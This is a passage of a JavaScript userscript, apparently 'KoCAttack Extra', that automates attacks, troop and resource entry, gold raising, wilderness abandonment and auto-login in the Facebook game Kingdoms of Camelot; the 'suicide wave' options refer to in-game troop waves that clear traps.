		bulkAddSuicideCheckbox.name = bulkAddSuicideCheckbox.id;
		bulkAddSuicideCheckbox.type='checkbox';
		bulkAddSuicideSpan.appendChild(bulkAddSuicideCheckbox);
		t.AddHtml(bulkAddSuicideSpan,'<label for="KOCAttackBulkAddSuicideWave">This is an initial suicide wave to wipe out traps on a wilderness.</label>');
		bulkAddDiv.appendChild(bulkAddSuicideSpan);
		bulkAddSuicideCheckbox.addEventListener('click',function() {
			var bulkAddSuicideWaveCheckbox = t.ById("KOCAttackBulkAddSuicideWave");
			var suicideWaveCheckbox = t.ById("KOCAttackSuicideWaveCheckbox");
			var locationType_Wilderness = t.ById("KOCAttackLocationType_Wilderness");
			var bulkAddLocationType_Wilderness = t.ById("KOCAttackBulkAddLocationType_Wilderness");
			if(bulkAddSuicideWaveCheckbox && suicideWaveCheckbox && locationType_Wilderness && bulkAddLocationType_Wilderness){
				if(bulkAddSuicideCheckbox.checked){
					suicideWaveCheckbox.checked = true;
					locationType_Wilderness.checked = true;
					bulkAddLocationType_Wilderness.checked = true;
				}else{
					suicideWaveCheckbox.checked = false;
				}
			}
		},false);
		t.AddHtml(bulkAddDiv,"<hr />");
		var coords=document.createElement('textarea');
		coords.wrap='off';
		coords.style.whiteSpace='nowrap';
		coords.cols=10;
		coords.rows=8;
		bulkAddDiv.appendChild(coords);
		t.AddHtml(bulkAddDiv,"<br />");
		var bulkAdd=document.createElement('a');
		bulkAdd.className='buttonDown20';
		bulkAdd.innerHTML='<span>Bulk Add</span>';
		bulkAddDiv.appendChild(bulkAdd);
		bulkAdd.addEventListener('click',function() {
			var locationType = "Camp";
			var locationTypeRadioBoxes = t.ByName('KOCAttackBulkAddLocationType');
			if(locationTypeRadioBoxes){
				for(var i = -1,j=locationTypeRadioBoxes.length; ++i < j;) {
					if(locationTypeRadioBoxes[i].checked) {
						locationType = locationTypeRadioBoxes[i].value;
						break;
					}
				}
			}
			var isSuicideWave = false;
			var bulkAddSuicideWaveCheckbox = t.ById("KOCAttackBulkAddSuicideWave");
			if(bulkAddSuicideWaveCheckbox){isSuicideWave = bulkAddSuicideWaveCheckbox.checked;}
			var otherIsSuicideWaveCheckbox = t.ById("KOCAttackSuicideWaveCheckbox");
			if(otherIsSuicideWaveCheckbox){	if(otherIsSuicideWaveCheckbox.checked){isSuicideWave=true;} }
			var added=t.BulkAddCoords(box,coords.value,t.ById('KOCAttackBulkAddForce').checked,locationType,isSuicideWave);
			bulkAddDiv.style.display='none';
			bulkAddAttackLink.style.display='inline';
			window.alert('Bulk added '+added+' coords');
		},false);
		t.AddHtml(bulkAddDiv,"<br />");
		var bulkAddAttackLink=document.createElement('a');
		bulkAddAttackLink.className='buttonDown20';
		bulkAddAttackLink.innerHTML='<span>Bulk add coords</span>';
		bulkAddAttackLink.addEventListener('click',function() {
			if(bulkAddDiv.style.display=='inline'){
				bulkAddDiv.style.display='none';
			}else{
				bulkAddDiv.style.display='inline';
			}
		},false);
		div.appendChild(bulkAddAttackLink);
		div.appendChild(bulkAddTable);
		return div;
	},
//------------------------------------------------------------------------------------------------------------
	hideAttackEffortsState : true,
	HideAttackEfforts: function () {
		var t = KOCAttack;
		if (!t.ById('modal_attack_march_boost')) { return; }
		var span = document.createElement('span');
		var a = document.createElement('a');
		a.innerHTML = 'Hide Attack/Speed Boosts';
		span.appendChild(a);
		if (t.hideAttackEffortsState) {
			hideshow('none');
		}
		a.addEventListener('click', function (evt) {
			t.hideAttackEffortsState = !t.hideAttackEffortsState;
			hideshow();
		}, false);
		for (var i =0; ++i < 5;) {
			document.getElementById('modal_attack_tab_' + i).addEventListener('click', hideshow, false);
			document.getElementById('modal_attack_tab_' + i).addEventListener('click', setLocationType, false);
		}
		return span;
		function setLocationType() {
			var attackTypeSelected = t.getAttackTypeSelected();
			if(attackTypeSelected==1){
				var KOCAttackLocationType_Transport = t.ById("KOCAttackLocationType_Transport");
				if(KOCAttackLocationType_Transport) { KOCAttackLocationType_Transport.checked = true; }
				var KOCAttackBulkAddLocationType_Transport = t.ById("KOCAttackBulkAddLocationType_Transport");
				if(KOCAttackBulkAddLocationType_Transport) { KOCAttackBulkAddLocationType_Transport.checked = true; }
			}else{
				var KOCAttackLocationType_Camp = t.ById("KOCAttackLocationType_Camp");
				if(KOCAttackLocationType_Camp) { KOCAttackLocationType_Camp.checked = true; }
				var KOCAttackBulkAddLocationType_Camp = t.ById("KOCAttackBulkAddLocationType_Camp");
				if(KOCAttackBulkAddLocationType_Camp) { KOCAttackBulkAddLocationType_Camp.checked = true; }
			}
		}
		function hideshow() {
			if (t.options.knightreset) {
				var attackTypeSelected = t.getAttackTypeSelected();
				var knightSelect = t.ById('modal_attack_knight');
				if (attackTypeSelected != 0) { knightSelect.selectedIndex = 0; }
			}
			if (t.hideAttackEffortsState) {
				disp = 'none';
			}else{
				disp = 'block';
			}
			t.ById('modal_attack_march_boost').style.display = disp;
			t.ById('modal_attack_attack_boost').style.display = disp;
			t.ById('modal_attack_defense_boost').style.display = disp;
			var div = t.ById('modal_attack_speed_boost');
			for (var i =-1,j=div.childNodes.length;++i < j;) {
				if (div.childNodes[i].className == 'section_title'){
					div.childNodes[i].style.display = disp;
				}
				if (div.childNodes[i].className == 'section_content') {
					div = div.childNodes[i];
					for (i = -1; ++i < j;) {
						if (div.childNodes[i].style != undefined && div.childNodes[i].className != 'estimated') {
							div.childNodes[i].style.display = disp;
						}
					}
					break;
				}
			}
		}
},
//------------------------------------------------------------------------------------------------------------
SetResourceInput:function(num,resourceCount) {
		var resource=this.ById('modal_attack_'+num);
		if(!resource) return null;
		resource.value=resourceCount;
		resource.style.backgroundColor='';
		var evt = document.createEvent("KeyboardEvent");
		if(evt.initKeyboardEvent) {
			evt.initKeyboardEvent("keyup",true,true,null,false,false,false,false,0x10,0);
		} else {
			evt.initKeyEvent("keyup",true,true,null,false,false,false,false,0x10,0);
		}
		resource.dispatchEvent(evt);

		if(parseInt(resourceCount)>0) {
			if(resource.value!=resourceCount) {
				this.Log('Not able to set resource count:'+num+',wanted:'+resourceCount+', count:'+resource.value);
				resource.style.backgroundColor='#f88';
				return 'notfull';
			} else {
				resource.style.backgroundColor='#ff8';
				return 'full';
			}
		}
		return 'none';
},
//------------------------------------------------------------------------------------------------------------
SetTroopInput:function(num,troopCount) {
		var troop=this.ById('modal_attack_unit_ipt'+num);
		if(!troop) return null;
		if(troop.disabled) return 'notfull';
		troop.value=troopCount;
		troop.style.backgroundColor='';
		var evt = document.createEvent("KeyboardEvent");
		if(evt.initKeyboardEvent) {
			evt.initKeyboardEvent("keyup",true,true,null,false,false,false,false,0x10,0);
		} else {
			evt.initKeyEvent("keyup",true,true,null,false,false,false,false,0x10,0);
		}
		troop.dispatchEvent(evt);
		if(parseInt(troopCount)>0) {
			if(troop.value!=troopCount) {
				this.Log('Not able to set troop count:'+num+',wanted:'+troopCount+', count:'+troop.value);
				troop.style.backgroundColor='#f88';
				return 'notfull';
			} else {
				troop.style.backgroundColor='#ff8';
				return 'full';
			}
		}
		return 'none';
},
//------------------------------------------------------------------------------------------------------------
GetRandTime:function(millis) {
		var millisPerc=millis*(this.options.randomPercent/100);
		var randSecs=Math.floor((Math.random()*millisPerc*2)-millisPerc)+millis;
		return randSecs;
},
//------------------------------------------------------------------------------------------------------------
GetAutoGold:function() {
		return this.GetValue('AutoGold,'+this.GetCurrentCityId(),false);
},
//------------------------------------------------------------------------------------------------------------
SetAutoGold:function(v) {
		return this.SetValue('AutoGold,'+this.GetCurrentCityId(),v);
},
//------------------------------------------------------------------------------------------------------------
GetAbandonWilds:function() {
		return this.GetValue('AbandonWilds_'+this.GetCurrentCityId(),false);
},
//------------------------------------------------------------------------------------------------------------
SetAbandonWilds:function(v) {
		return this.SetValue('AbandonWilds_'+this.GetCurrentCityId(),v);
},
//------------------------------------------------------------------------------------------------------------
CheckAutoRaiseGold:function() {
		if(!this.GetAutoGold()) return;
		var happiness=parseInt(this.GetSeed().citystats["city" + this.GetCurrentCityId()].pop[2]);
		if(happiness>=this.options.autoGoldHappiness) {
			this.DoUnsafeWindow("modal_raise_gold();");
		}
},
//------------------------------------------------------------------------------------------------------------
CheckAbandonWilds:function() {
		var t=this;
		if(!this.GetAbandonWilds()) return;
		var castle=t.ById('slot_0');
		t.Click(castle);
		this.DoUnsafeWindow("changeCastleModalTabs(2);");
		var wildsWindow=t.ById('castle_2');
		var rows=wildsWindow.getElementsByTagName('tr');
		if (rows.length==1) {
			this.DoUnsafeWindow("Modal.hideModal();");
			return;
		}
		var commands = [];
		for (var i=-1,r=rows.length;++i<r;) {
			var abandonButton=rows[i].getElementsByTagName('a')[1];
			if (abandonButton==undefined) {
				continue;
			}
			var command=abandonButton.getAttribute('onclick');
			command=command.substring(0,command.length-13);
			if(command.indexOf("wilderness_abandon")>-1){
				var tmp_obj = {};
				tmp_obj.command = command;
				tmp_obj.clicked = false;
				commands.push(tmp_obj);
			}
		}
		var command_timer=0;
		var milliseconds_between=4000;
		for (var i=-1,k=commands.length;++i<k;) {
			window.setTimeout(function() {
				var unclicked_commandObj = undefined;
				for (var j=-1;++j<k;) {
					if(!commands[j].clicked){
						t.DoUnsafeWindow(commands[j].command);
						window.setTimeout(function() {
							var mainbody = t.ById("mainbody");
							if(mainbody){
								var okay_btn=t.FindByXPath(mainbody,".//a[contains(@class,'okay')]");
								if(okay_btn){
									t.Click(okay_btn);
								}
							}
						},500);
						commands[j].clicked = true;
						break;
					}
				}
			},t.GetRandTime(command_timer));
			command_timer+=milliseconds_between;
		}
		window.setTimeout(function() {
			t.DoUnsafeWindow("Modal.hideModal();");
		},t.GetRandTime(command_timer));
},
//------------------------------------------------------------------------------------------------------------
//GetDisplayName:function(){
//		var DisplayName = this.ById('topnavDisplayName');
//		if(DisplayName){
//			DisplayName = DisplayName.innerHTML;
//		}else{
//			DisplayName = null;
//		}
//		return DisplayName
//},
//------------------------------------------------------------------------------------------------------------
//HandleChatPane:function() {
//		var t=this;
//		var DisplayName = t.GetDisplayName();
//		var AllianceChatBox=t.ById('mod_comm_list2');
//		if(AllianceChatBox){
//			var chatPosts = document.evaluate(".//div[contains(@class,'chatwrap')]", AllianceChatBox, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null );
//			if(chatPosts){
//				for (var i = -1,k=chatPosts.snapshotLength; ++i < k;) {
//					thisPost = chatPosts.snapshotItem(i);
//					if(t.options.autoHelpAlliance){
//						var postAuthor = document.evaluate('.//*[@class="nm"]', thisPost, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null );
//						if(postAuthor.snapshotItem(0)){
//							var postAuthorName = postAuthor.snapshotItem(0).innerHTML;
//							if(postAuthorName != DisplayName){
//								var helpAllianceLinks=document.evaluate(".//a[contains(@onclick,'claimAllianceChatHelp')]", thisPost, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null );
//								if(helpAllianceLinks){
//									for (var j = -1,l =helpAllianceLinks.snapshotLength; ++j < l;) {
//										thisLink = helpAllianceLinks.snapshotItem(j);
//										var alreadyClicked = thisLink.getAttribute("clicked");
//										if(!alreadyClicked){
//											thisLink.setAttribute('clicked', 'true');
//											var myregexp = /(claimAllianceChatHelp\(.*\);)/;
//											var match = myregexp.exec(thisLink.getAttribute("onclick"));
//											if (match != null) {
//												onclickCode = match[0];
//												if(!t.FindInCommandHistory(onclickCode, 'alliance_help')){
//													t.DoUnsafeWindow(onclickCode);
//													this.AddToCommandHistory(onclickCode, 'alliance_help');
//												}else{
//												}
//											}
//										}else{
//										}
//									}
//								}else{
//								}
//							}else{
//							}
//						}else{
//						}
//					}
//					if(t.options.hideAllianceHelpRequests){
//						var helpAllianceLinks=document.evaluate(".//a[contains(@onclick,'claimAllianceChatHelp')]", thisPost, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null );
//						if(helpAllianceLinks){
//							for (var j = -1,k=helpAllianceLinks.snapshotLength; ++j < k;) {
//								thisLink = helpAllianceLinks.snapshotItem(j);
//								thisLink.parentNode.parentNode.parentNode.parentNode.parentNode.removeChild(thisLink.parentNode.parentNode.parentNode.parentNode);
//							}
//						}
//					}
//					if(t.options.hideAllianceHelpRequests){
//						var myregexp1 = /You are # [1-5] of 5 to help/i;
//						var myregexp2 = /\'s Kingdom does not need help\./i;
//						var myregexp3 = /\'s project has already been completed\./i;
//						var myregexp4 = /\'s project has received the maximum amount of help\./i;
//						if (thisPost.innerHTML.match(myregexp1) || thisPost.innerHTML.match(myregexp2) || thisPost.innerHTML.match(myregexp3) || thisPost.innerHTML.match(myregexp4)) {
//							thisPost.parentNode.removeChild(thisPost);
//						}
//					}
//
//				}
//			}
//		}
//},
//------------------------------------------------------------------------------------------------------------
// 80: Everyone
// 50: Friends of Friends
// 40: Friends Only
// 10: Only Me
//HandlePublishPopup:function() {
//		var t=this;
//		if (t.currentPage == "facebook_popup") {
//			if(t.options.autoPublishGamePopups){
//				var FBInputForm = t.ById('uiserver_form');
//				if(FBInputForm){
//					var channel_input = t.FindByXPath(FBInputForm,".//input[contains(@name,'channel')]");
//					if(channel_input){
//						var current_channel_url = channel_input.value;
//						if (current_channel_url.match(/http:\/\/.{0,100}kingdomsofcamelot\.com\/.*?\/cross_iframe\.htm/i)) {
//							var publish_button = t.FindByXPath(FBInputForm,".//input[@type='submit' and contains(@name,'publish')]");
//							var privacy_setting = t.FindByXPath(FBInputForm,".//input[@type='hidden' and contains(@name, 'privacy_data') and contains(@name, 'value')]");
//							if(publish_button && privacy_setting){
//								privacy_setting.value = t.options.autoPublishPrivacySetting;
//								t.Click(publish_button);
//							}
//						}
//					}
//				}
//			}
//		}
//},
//------------------------------------------------------------------------------------------------------------
domainLoginTimer:null,
domainLoginStartTime:null,
domainLoginCurrentTime:null,
domainLoginSeconds:30,
domainLoginActionTaken:false,
HandleDomainLogin:function() {
		var t=this;
		if (t.currentPage == "domain_selection" && t.options.autoLogBackIn && !t.domainLoginActionTaken) {

			if(!t.domainLoginStartTime){
				t.domainLoginStartTime = Math.round(new Date().getTime() / 1000);
			}
			t.domainLoginCurrentTime = Math.round(new Date().getTime() / 1000);
			var timeDifference = Math.round(t.domainLoginStartTime+t.domainLoginSeconds - t.domainLoginCurrentTime);
			if(timeDifference<0){ timeDifference=0; }
			var statusDiv=t.ById('KOCAttackLoginStatus');
			if(!statusDiv) {
				statusDiv=document.createElement('div');
				statusDiv.id='KOCAttackLoginStatus';
				statusDiv.setAttribute('style', 'position:relative; background-color:#fff; border:3px solid #888; margin:30px 0px 0px 0px; padding:10px; display:none;');
				var loginBox = t.ById("formoptions0");
				loginBox.appendChild(statusDiv);
			}
			var playButtons=document.evaluate(".//a[contains(@class,'button20')]", unsafeWindow.document.body, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null );
			if(playButtons && playButtons.snapshotLength>0){
				statusDiv.innerHTML='<center>KoCAttack Extra: Automatically logging back into KoC in '+timeDifference+' seconds...</center>';
				if(timeDifference==0){
					t.Log("Loading URL: http://apps.facebook.com/kingdomsofcamelot/");
					statusDiv.innerHTML='<center>KoCAttack Extra: Automatically logging back into KoC now...</center>';
					var functionCall = {
						'action':'load_url',
						'parameters':'http://apps.facebook.com/kingdomsofcamelot/'
					};
					t.AddCrossIframeCommand("domain_selection_app_page", functionCall);
					t.domainLoginActionTaken=true;
					window.setTimeout(function() {
						t.ReloadWindow();
					},10000);
				}
			}else{
				statusDiv.innerHTML='<center>KoCAttack Extra: Automatically reloading page in '+timeDifference+' seconds...</center>';
				if(timeDifference==0){
					statusDiv.innerHTML='<center>KoCAttack Extra: Automatically reloading page now...</center>';
					t.ReloadWindow();
					t.domainLoginActionTaken=true;
				}
			}
			statusDiv.style.display='block';

			if(!t.domainLoginTimer && !t.domainLoginActionTaken) {
				t.domainLoginTimer=window.setTimeout(function() {
					t.domainLoginTimer=null;
					t.HandleDomainLogin();
				},1000);
			}
		}
},
//------------------------------------------------------------------------------------------------------------
HandleCrossIframeCommands:function() {
		var t=this;
		var commands = t.GetCrossIframeCommands();
		if(!commands.queue) return false;
		var commandsUpdated = false;
		for(var i=-1,j=commands.queue.length; ++i<j;) {
			var command = commands.queue[i];
			if(t.currentPage == command.pageName){
				if(command.functionCall.action == "load_url"){
					setTimeout (function (){window.location.href=command.functionCall.parameters;}, 0);
				}
				t.ArrayRemoveItem(commands.queue, i);
				commandsUpdated=true;
			}
		}
		if(commandsUpdated){
			this.SetCrossIframeCommands(commands);
		}
},
//------------------------------------------------------------------------------------------------------------
OnCastleBoxAppear:function(box) {
		var t=this;
		var raiseGold=t.FindByXPath(box,".//a[contains(@onclick,'raiseGold')]");
		var a=document.createElement('a');
		a.className='button25';
		function SetAutoGoldA() {
			var str=t.GetAutoGold()?'Auto - On':'Auto - Off';
			a.innerHTML='<span>'+str+'</span>';
		}
		a.addEventListener('click',function() {
			var autoGold=t.GetAutoGold();
			t.SetAutoGold(autoGold?false:true);
			SetAutoGoldA();
		},false);
		SetAutoGoldA();
		raiseGold.parentNode.insertBefore(a,raiseGold.nextSibling);
		var productionHeader=t.FindByXPath(box,".//div[contains(@class,'prodtableheader')]");
		productionHeader=productionHeader.parentNode;
		var b=document.createElement('a');
		b.className='button25';
		function SetAbandonWildsA() {
			var str=t.GetAbandonWilds()?'Abandon Wilds - On':'Abandon Wilds - Off';
			b.innerHTML='<span>'+str+'</span>';
		}
		b.addEventListener('click',function() {
			var abandonWilds=t.GetAbandonWilds();
			if(!abandonWilds){
				var abandonWildsConfirm = confirm("Are you sure you want to automatically abandon all wildernesses?\n")
				if (!abandonWildsConfirm){
					return false;
				}
			}
			t.SetAbandonWilds(abandonWilds?false:true);
			SetAbandonWildsA();
		},false);
		SetAbandonWildsA();
		productionHeader.parentNode.insertBefore(b,productionHeader);
},
//------------------------------------------------------------------------------------------------------------
	ClickShareToWall:function(box) {
		var t=this;
		if(t.options.autoPublishGamePopups){
			var sharetowall_btn = t.FindByXPath(box,".//a[contains(@onclick,'gethelp')]");
			t.Click(sharetowall_btn);
		}
	},
//------------------------------------------------------------------------------------------------------------
	marketBoxTimeout:null,
	OnMarketBoxAppear:function(box) {
		var marketBox=this.ById('marketmain_bdy');
		var t=this;
		if(marketBox) {
			window.setTimeout(function() {
				t.OnMarketBoxAppear();
			},250);
			var amt=t.ById('marketmod_amount');
			if(amt && amt.value=="0") amt.value='999000';
			var price=t.ById('marketmod_price');
			if(price && price.value=="0") price.value='1';
		}
},
//------------------------------------------------------------------------------------------------------------
nextAutoAttackTimeout:null,
onclickTimeRe:/,([0-9]+),[0-9]+,[0-9]+,[0-9]+[^,]*$/,
waitForAttackBoxAppear:null,
knightmarchid:0,
OnAttackBoxAppear:function(box) {
		var btnMarch=this.ById('btnMarch');
		var t=this;
		if(!btnMarch) {
			this.Log('no march button');
			window.setTimeout(function() {
				t.OnAttackBoxAppear(box);
			},1000);
			return;
		}
		this.StopWaitForAttackBoxAppear();
		if(t.ById('KocAttackComment')) {
			this.Log("We already have an attack dialog opened");
			return;
		}
		var addAttackContainerDiv=document.createElement('div');
		addAttackContainerDiv.id = "addAttackButtonContainerDiv";
		addAttackContainerDiv.setAttribute('style', 'position:relative; width:1px; height:1px; overflow:visible;');
		var addAttackDiv=document.createElement('div');
		addAttackDiv.id = "addAttackButtonDiv";
		addAttackDiv.setAttribute('style', 'width:250px; left:430px; top:5px; position:absolute; overflow:visible; textAlign:left;');
		var addBtn=document.createElement('a');
		addBtn.className='button25';
		addBtn.style.cssFloat="left";
		addBtn.innerHTML='<span>Add Attack</span>';
		addBtn.addEventListener('click',function() {
			t.ClickMarch(null, box, true, true);
		},false);
		addAttackDiv.appendChild(addBtn);
		addAttackContainerDiv.appendChild(addAttackDiv);
		var locationTypeDiv=document.createElement('div');
		locationTypeDiv.id="KOCAttackLocationTypeDiv"
		locationTypeDiv.setAttribute('style', 'width:300px; position:absolute; left:0px; top:-23px; fontSize:10px; textAlign:left;');
  	var arrData = [["Camp", "Camp"],["City", "City"],["Transport", "Transport"],["Wilderness", "Wilderness"]];
		for (var i=-1,j=arrData.length; ++i < j;){
			var objRadItem = document.createElement("input");
			objRadItem.type = "radio";
			objRadItem.name = "KOCAttackLocationType";
			objRadItem.id = "KOCAttackLocationType_" + arrData[i][0];
			objRadItem.value = arrData[i][0];
			if(i == 0) {objRadItem.defaultChecked = true; objRadItem.checked = true; };
			var objTextNode = document.createTextNode(" " + arrData[i][1]);
			var objLabel = document.createElement("label");
			objLabel.htmlFor = objRadItem.id;
			objLabel.appendChild(objRadItem);
			objLabel.appendChild(objTextNode);
			locationTypeDiv.appendChild(objLabel);
			objRadItem.addEventListener('change',function() {
				var locationType = "Camp";
				var locationTypeRadioBoxes = t.ByName('KOCAttackLocationType');
				if(locationTypeRadioBoxes){
					for(var k = -1,m=locationTypeRadioBoxes.length; ++k < m;) {
						if(locationTypeRadioBoxes[k].checked) {
							locationType = locationTypeRadioBoxes[k].value;
							break;
						}
					}
				}
				var bulkLocationTypeRadioBoxes = t.ByName('KOCAttackBulkAddLocationType');
				if(bulkLocationTypeRadioBoxes){
					for(var n = -1,p = bulkLocationTypeRadioBoxes.length; ++n < p;) {
						if(bulkLocationTypeRadioBoxes[n].value == locationType) {
							bulkLocationTypeRadioBoxes[n].checked = true;
							break;
						}
					}
				}
			},false);
		};
		addAttackDiv.appendChild(locationTypeDiv);
		var suicideSpan=document.createElement('span');
		suicideSpan.style.fontSize="11px";
		var suicideCheckbox=document.createElement('input');
		suicideCheckbox.id = "KOCAttackSuicideWaveCheckbox";
		suicideCheckbox.name = suicideCheckbox.id;
		suicideCheckbox.type='checkbox';
		suicideSpan.appendChild(suicideCheckbox);
		t.AddHtml(suicideSpan,'<label for="KOCAttackSuicideWaveCheckbox">This is a suicide wave</label>');
		addAttackDiv.appendChild(suicideSpan);
		suicideCheckbox.addEventListener('click',function() {
			var bulkAddSuicideWaveCheckbox = t.ById("KOCAttackBulkAddSuicideWave");
			var locationType_Wilderness = t.ById("KOCAttackLocationType_Wilderness");
			var bulkAddLocationType_Wilderness = t.ById("KOCAttackBulkAddLocationType_Wilderness");
			if(bulkAddSuicideWaveCheckbox && locationType_Wilderness && bulkAddLocationType_Wilderness){
				if(suicideCheckbox.checked){
					bulkAddSuicideWaveCheckbox.checked = true;
					locationType_Wilderness.checked = true;
					bulkAddLocationType_Wilderness.checked = true;
				}else{
					bulkAddSuicideWaveCheckbox.checked = false;
				}
			}
		},false);
		if(btnMarch){
			btnMarch.parentNode.insertBefore(addAttackContainerDiv,btnMarch);
		}
		var comment=document.createElement('input');
		comment.id='KocAttackComment';
		comment.size='30';
		var nowSecs=new Date().getTime()/1000;
		var div=document.createElement('div');
		t.AddText(div,'Comment:');
		div.appendChild(comment);
		div.appendChild(document.createElement('br'));
		var div2=document.createElement('div');
		var ignore=document.createElement('input');
		ignore.type='checkbox';
		div2.appendChild(ignore);
		t.AddText(div2,'Ignore in the attack list');
		var div3=document.createElement('div');
		var deletefarmno=document.createElement('input');
		deletefarmno.type='checkbox';
		div3.appendChild(deletefarmno);
		t.AddText(div3,'Do not delete this report');
		var nextElement=t.ById('marchTypeDesc');
		div.appendChild (div2);
		div2.appendChild (div3);
		var xy=this.GetGuiCoords();
		var attack=null;
		if(xy) {
			attack=this.GetAttack(xy[0],xy[1]);
		}
		var notFullTroops=false;
		var notFullResources=false;
		var knightSelect=t.ById('modal_attack_knight');
		var totalTroops=0;
		var totalResources=0;
		var attackTypeSelected = t.getAttackTypeSelected();
		if(attack) {
			ignore.checked=attack.ignore?true:false;
			deletefarmno.checked=attack.deletefarmno?true:false;
			if(attack.time) {
				t.AddHtml(div,'Last attack: '+t.SecsToStr(nowSecs-attack.time)+' ago<br />');
			}
			if(attack.comment){
				comment.value=attack.comment;
			}
			var wildtype={
				'Lake':'Wilderness',
				'Mountains':'Wilderness',
				'Woods':'Wilderness',
				'Forest':'Wilderness',
				'Plain':'Wilderness',
				'Hills':'Wilderness',
				'Grassland':'Wilderness',
				'Wilderness':'Wilderness'
			};
			var levelInfo=this.GetLevelInfo(attack);
			var locationType = "City";
			if(levelInfo && levelInfo.type) {
				locationType = levelInfo.type;
			}
			if(wildtype[levelInfo.type]) {
				locationType = wildtype[levelInfo.type];
			}
			var locationTypeRadioBoxes = t.ByName('KOCAttackLocationType');
			if(locationTypeRadioBoxes){
				for(var i = -1,j=locationTypeRadioBoxes.length; ++i < j;) {
					if(locationTypeRadioBoxes[i].value == locationType) {
						locationTypeRadioBoxes[i].checked = true;
						break;
					}
				}
			}
			var bulkLocationTypeRadioBoxes = t.ByName('KOCAttackBulkAddLocationType');
			if(bulkLocationTypeRadioBoxes){
				for(var i = -1,j=bulkLocationTypeRadioBoxes.length; ++i < j;) {
					if(bulkLocationTypeRadioBoxes[i].value == locationType) {
						bulkLocationTypeRadioBoxes[i].checked = true;
						break;
					}
				}
			}
			if(attackTypeSelected==0 && attack.type==0) {
				SuicideAttackDefined = this.isSuicideAttackDefinedAtLocation(xy[0], xy[1])
				if(this.prevAttack) { this.Log('Previous attack:'+this.prevAttack.x+'=='+xy[0] +','+this.prevAttack.y+'=='+xy[1] ); }
				var firstAttack = this.IsFirstAttackAtLocation(xy[0], xy[1]);
				this.Log("current attack wave type: "+attack.currenttattackwavetype);
				if(SuicideAttackDefined && firstAttack) {
					if(typeof(attack.suicidewave)=="object") {
						for(var i=0,j=attack.suicidewave.length; ++i<j;) {
							this.SetTroopInput(i,attack.suicidewave[i]);
							totalTroops+=attack.suicidewave[i];
						}
					} else {
						this.SetTroopInput(2,attack.suicidewave);
						totalTroops+=attack.suicidewave;
					}
					suicideCheckbox.checked = true;
				} else if(attack.troops) {
					for(var tr=-1,j=attack.troops.length; ++tr<j;) {
						var troopCount=attack.troops[tr];
						if(!troopCount) continue;
						totalTroops+=troopCount;
						if(this.SetTroopInput(tr,troopCount)=='notfull') {
							notFullTroops=true;
						}
					}
					suicideCheckbox.checked = false;
				}
				if(this.knightmarchid == knightSelect.options[knightSelect.selectedIndex].value){
					knightSelect.selectedIndex = 1+Math.floor(Math.random()*(knightSelect.options.length-1));
					}
			} else if (attackTypeSelected==1 && attack.type==1) {
				t.ById('KOCAttackLocationType_Transport').checked;
				var supplyfilter_checkbox = t.ById('modal_attack_supplyfilter_checkbox');
				if(supplyfilter_checkbox){
					if(supplyfilter_checkbox.checked){
						supplyfilter_checkbox.click();
					}
				}
				var resourceTypes = Array(
					'gold',
					'rec1',
					'rec2',
					'rec3',
					'rec4'
				);
				for(var tr=-1,j=attack.troops.length; ++tr<j;) {
					var troopCount=attack.troops[tr];
					if(!troopCount) continue;
					totalTroops+=troopCount;
					if(this.SetTroopInput(tr,troopCount)=='notfull') {
						this.Log("Input field disabled for troop type: "+tr);
						notFullTroops=true;
					}
				}
				for(var res=-1,j=attack.resources.length; ++res<j;) {
					var resourceCount=attack.resources[res];
					if(!resourceCount) continue;
					totalResources+=resourceCount;
					if(this.SetResourceInput(resourceTypes[res],resourceCount)=='notfull') {
						notFullResources=true;
					}
				}
				knightSelect.selectedIndex = 0;
			}
			if(attack.messages) {
				div.appendChild(document.createElement('br'));
				for(var m=attack.messages.length; --m>=0;) {
					var message=attack.messages[m];
					var ma=document.createElement('a');
					var mess=message[0];
					var timeNumM=this.onclickTimeRe.exec(message[1]);
					if(timeNumM) {
						var secs=nowSecs-parseInt(timeNumM[1]);
						mess=t.SecsToStr(secs)+' ago, '+mess;
						}
					ma.innerHTML=mess;
					ma.setAttribute('onclick',"var m=CreateMsgDiv(); "+ message[1]+'');
					ma.href='javascript:;';
					div.appendChild(ma);
					div.appendChild(document.createElement('br'));
				}
				div.appendChild(document.createElement('br'));
			}
			var deleteBtnDiv=document.createElement('div');
			deleteBtnDiv.id = "deleteAttackButtonDiv";
			deleteBtnDiv.setAttribute('style', 'width:115px; left:203px; top:5px; position:absolute;');
			var deleteBtn=document.createElement('a');
			deleteBtn.className='button25';
			deleteBtn.innerHTML='<span>Delete Attack</span>';
			deleteBtn.addEventListener('click',function() {
				t.DeleteAttack(xy[0],xy[1]);
				t.DoUnsafeWindow('Modal.hideModalAll();');
			},false);
			deleteBtnDiv.appendChild(deleteBtn);
			addAttackContainerDiv.appendChild(deleteBtnDiv);
		}
		var ChangeAttack=function() {
			var xy=t.GetGuiCoords();
			var attack=null;
			if(xy) {
				attack=t.GetAttack(xy[0],xy[1]);
			}
			if(!attack) attack={};
			if(t.getAttackTypeSelected()!=attack.type) {
				t.Log('We wont change an attack if the type is different. You must delete the attack to change the type');
				return;
			}
			attack.comment=comment.value;
			attack.ignore=ignore.checked?true:undefined;
			attack.deletefarmno=deletefarmno.checked?true:undefined;
			t.SetAttack(xy[0],xy[1],attack);
		}
		comment.addEventListener('change',function() { ChangeAttack(); },false);
		ignore.addEventListener('change',function() { ChangeAttack(); },false);
		deletefarmno.addEventListener('change',function() { ChangeAttack(); },false);
		var divContainer = document.createElement ('div');
		divContainer.setAttribute('style', 'padding:0px 12px; height:320px; maxHeight:320px; overflowY:auto;');
		divContainer.appendChild(this.HideAttackEfforts());
		divContainer.appendChild(div);
		divContainer.appendChild(this.BulkAddAttackLink(box));
		document.getElementById ('modal_attack').appendChild(divContainer);
		this.AttachXYPaste('modal_attack_target_coords_x','modal_attack_target_coords_y');
		var autoAttack=this.GetAutoAttack();
		if(autoAttack && autoAttack.x==xy[0] && autoAttack.y==xy[1] && !ignore.checked) {
			autoAttack.x=autoAttack.y=-1;
			this.SetAutoAttack(autoAttack);
			if(totalTroops>0
			&& (knightSelect.options.length>1 || attackTypeSelected==1)
			&& !notFullTroops
			&& !notFullResources
			&& btnMarch.className.indexOf('grey')<0
			) {
				this.Log('Auto attack: '+xy[0]+','+xy[1]+', from city:'+this.autoAttackCityUpto);
